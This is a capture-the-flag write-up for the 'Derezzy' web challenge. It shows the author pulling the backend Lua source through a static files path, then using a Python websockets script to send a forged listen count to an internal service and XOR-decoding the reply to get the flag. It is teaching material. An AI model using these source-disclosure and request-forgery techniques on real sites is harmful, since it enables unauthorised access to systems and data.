## Solution for: Derezzy

### Concept

A few concepts. One: recovering files we aren't *really* supposed to. Two: analyzing site source to figure out how it works on the backend. Three: taking advantage of loopholes and bypassing the middleman.

### Solve

So we get a dope website that plays Derezzed, objectively the best song from Tron. It just plays....and plays....and plays.

Helpfully, we have a message "FLAG @ 100 HOURS". Obviously though, we don't want to wait that long. We should probably look at the site source. It is minified, but that's not a big deal.

```js
var now_playing=document.querySelector(".now-playing"),track_art=document.querySelector(".track-art"),track_name=document.querySelector(".track-name"),track_artist=document.querySelector(".track-artist"),playpause_btn=document.querySelector(".playpause-track"),next_btn=document.querySelector(".next-track"),prev_btn=document.querySelector(".prev-track"),seek_slider=document.querySelector(".seek_slider"),volume_slider=document.querySelector(".volume_slider"),curr_time=document.querySelector(".current-time"),
total_duration=document.querySelector(".total-duration"),track_index=0,isPlaying=!1,updateTimer,curr_track=document.createElement("audio"),interval=0,bpm=0,track_list=[{name:"Derezzed",artist:"Daft Punk",image:"/static/files/derezzed.jpeg",path:"/static/files/derezzed.mp3"}];function random_bg_color(){document.body.style.background="rgb("+(Math.floor(256*Math.random())+64)+","+(Math.floor(256*Math.random())+64)+","+(Math.floor(256*Math.random())+64)+")"}
function loadTrack(a){clearInterval(updateTimer);resetValues();curr_track.src=track_list[a].path;curr_track.load();track_art.style.backgroundImage="url("+track_list[a].image+")";track_name.textContent=track_list[a].name;track_artist.textContent=track_list[a].artist;now_playing.textContent="DEREZZED: 100 HOUR EDITION. FLAG @ 100HRS";updateTimer=setInterval(seekUpdate,1E3);curr_track.addEventListener("ended",nextTrack);random_bg_color()}
function resetValues(){curr_time.textContent="00:00";total_duration.textContent="00:00";seek_slider.value=0}loadTrack(track_index);function playpauseTrack(){isPlaying?pauseTrack():playTrack()}function updateServer(){$.post("update",{request:"listen",path:"app.lua"},function(a,b){"success"==b?console.log("successful update"):console.log("unsuccessful update")})}
function playTrack(){curr_track.play();isPlaying=!0;playpause_btn.innerHTML='<i class="fa fa-pause-circle fa-5x"></i>';updateServer();interval=setInterval(updateServer,104E3);bpm=setInterval(random_bg_color,500)}function pauseTrack(){curr_track.pause();isPlaying=!1;playpause_btn.innerHTML='<i class="fa fa-play-circle fa-5x"></i>';window.clearInterval(interval);window.clearInterval(bpm)}
function nextTrack(){track_index=track_index<track_list.length-1?track_index+1:0;loadTrack(track_index);playTrack()}function prevTrack(){track_index=0<track_index?track_index-1:track_list.length;loadTrack(track_index);playTrack()}function seekTo(){seekto=seek_slider.value/100*curr_track.duration;curr_track.currentTime=seekto}function setVolume(){curr_track.volume=volume_slider.value/100}
function seekUpdate(){if(!isNaN(curr_track.duration)){var a=100/curr_track.duration*curr_track.currentTime;seek_slider.value=a;a=Math.floor(curr_track.currentTime/60);var b=Math.floor(curr_track.currentTime-60*a),c=Math.floor(curr_track.duration/60),d=Math.floor(curr_track.duration-60*c);10>b&&(b="0"+b);10>d&&(d="0"+d);10>a&&(a="0"+a);10>c&&(c="0"+c);curr_time.textContent=a+":"+b;total_duration.textContent=c+":"+d}};
```

In there of special note we see that we're grabbing the track from "/static/files/derezzed.mp3". We also see a suspicious value in here: path: "app.lua". If we put 2 and 2 together, we'll request "/static/files/app.lua" and get the backend source for the site.

I'm not going to reverse this lua script but of special note we have:
```lua
if listener.count >= 3470 then
    local ws = w.new_from_uri("ws://localhost:8181")
    assert(ws:connect())
    data = {
      user = self.session.id,
      listens = listener.count
    }
    assert(ws:send(cjson.encode(data)))
    data = cjson.decode(assert(ws:receive()))
    assert(ws:close())
end
```

So....hmm. We should maybe try and connect to that and give it a listen count it likes. We can do that with python:

```python

import asyncio
import websockets
import json

async def solve():
    uri = "ws://127.0.0.1:8181"
    async with websockets.connect(uri) as websocket:
        name = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        data = {"user": name, "count": 3500}
        await websocket.send(json.dumps(data))
        resp = await websocket.recv()
        print(resp)

asyncio.get_event_loop().run_until_complete(solve())
```

Now we'll be a bit surprised to get some garbage back. Luckily for us, it's pretty easy to assume that the output is just our input XORed with the flag. If we dexor everything with our input we get the flag:


```python

import asyncio
import websockets
import json

async def solve():
    uri = "ws://127.0.0.1:8181"
    async with websockets.connect(uri) as websocket:
        name = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        data = {"user": name, "count": 3500}
        await websocket.send(json.dumps(data))
        resp = await websocket.recv()
        for r in resp:
            print(chr(ord(r) ^ 0x41), end="")

asyncio.get_event_loop().run_until_complete(solve())
```

One more wrinkle is we do need to give an input long enough to xor the whole flag with but this will be reasonably obvious given uh...seeing "flag{" in the output.

:)
